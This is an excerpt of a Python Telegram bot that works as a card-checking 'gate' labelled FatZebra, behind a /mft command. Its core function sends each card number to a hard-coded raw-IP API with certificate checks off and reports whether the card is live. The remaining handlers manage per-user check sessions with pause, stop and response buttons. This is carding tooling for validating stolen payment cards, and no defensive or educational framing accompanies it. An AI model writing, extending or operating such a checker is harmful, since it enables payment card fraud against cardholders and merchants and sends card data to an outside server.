...
GATE_NAME = "FatZebra"
GATE_CMD = "mft"
MFT_API = "http://5.83.136.66:8003/fatzebra?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(MFT_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("mft"))
async def mft_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mft_card_"))
async def mft_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mft_response_"))
async def mft_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mft_stop_"))
async def mft_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mft_pause_"))
async def mft_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
